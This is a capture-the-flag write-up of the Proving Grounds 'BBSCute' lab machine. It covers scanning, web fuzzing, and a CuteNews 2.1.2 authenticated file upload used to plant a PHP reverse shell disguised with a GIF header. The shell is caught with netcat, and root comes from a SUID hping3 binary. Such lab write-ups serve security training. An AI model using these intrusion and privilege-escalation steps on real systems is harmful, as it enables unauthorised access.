---
layout: default
title: BBSCute
parent: Proving Grounds Play
nav_order: 6
---

# Scanning

---

```bash
sudo nmap -Pn -p- -sC -sV -T4 -vv --open <ip>
```

# Enumeration

---

## 80 - HTTP

### wfuzz

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
--hc 404 "http://192.168.222.128/FUZZ"

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl.
 Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.222.128/FUZZ
Total requests: 37050

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        168 L    396 W      6175 Ch     "index.php"
000000006:   200        63 L     481 W      3119 Ch     "LICENSE.txt"
000000002:   200        5 L      206 W      5182 Ch     "search.php"
000000069:   200        368 L    933 W      10701 Ch    "index.html"
000000063:   200        1 L      16 W       105 Ch      "rss.php"
000000126:   200        0 L      6 W        28 Ch       "print.php"
000000119:   200        0 L      7 W        94 Ch       "captcha.php"
000000110:   200        0 L      12 W       1052 Ch     "favicon.ico"
000000157:   403        9 L      28 W       280 Ch      ".htaccess"
000000379:   200        368 L    933 W      10701 Ch    "."
000000537:   403        9 L      28 W       280 Ch      ".html"
000000668:   200        0 L      6 W        28 Ch       "popup.php"
000000806:   403        9 L      28 W       280 Ch      ".php"
000001564:   403        9 L      28 W       280 Ch      ".htpasswd"
000001830:   403        9 L      28 W       280 Ch      ".htm"
000002100:   403        9 L      28 W       280 Ch      ".htpasswds"
000003551:   200        154 L    752 W      9522 Ch     "example.php"
000004625:   403        9 L      28 W       280 Ch      ".htgroup"
000005172:   403        9 L      28 W       280 Ch      "wp-forum.phps"
000007079:   403        9 L      28 W       280 Ch      ".htaccess.bak"
```

The two most interesting files discovered are _index.php_ and _captcha.php_.

### Register User

_example.php_ shows the domain _cute.calipendula_ so we add that to our _/etc/hosts_ file.

![calipendula](../../../assets/images/ctfs/proving_grounds/bbscute/calipendula.png)

![hosts](../../../assets/images/ctfs/proving_grounds/bbscute/hosts.png)

_index.php_ is a login screen with the ability to register a user.

![index](../../../assets/images/ctfs/proving_grounds/bbscute/index.png)

The registration process requires a captcha value which we can obtain from _captcha.php_

![captcha](../../../assets/images/ctfs/proving_grounds/bbscute/captcha.png)

Login with the registered user.

![login](../../../assets/images/ctfs/proving_grounds/bbscute/login.png)

# Exploitation

---

## CuteNews 2.1.2 - Authenticated Arbitrary File Upload

[Exploit Database CuteNews 2.1.2 exploit for authenticated arbitrary file upload.](https://www.exploit-db.com/exploits/48458)

Copy Pentest Monkey reverse shell to the current directory.
Edit to attach machine parameters and include _GIF8;_ at the top of the script.

![rev_shell](../../../assets/images/ctfs/proving_grounds/bbscute/rev_shell.png)

Upload the file to the registered user's avatar.

![avatar](../../../assets/images/ctfs/proving_grounds/bbscute/avatar.png)

As soon as we regresh the registered user's personal options page we have a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/bbscute]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.222.128] 52280
Linux cute.calipendula 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 03:15:02 up  1:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## SUID Permissions

```bash
www-data@cute:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/mount
/usr/sbin/hping3
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device

```

## Exploit hping3 SUID

![suid](../../../assets/images/ctfs/proving_grounds/bbscute/suid.png)

Simply executing the _hping3_ binary gives us a root shell.

```bash
www-data@cute:/$ /usr/sbin/hping3
hping3> id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

```
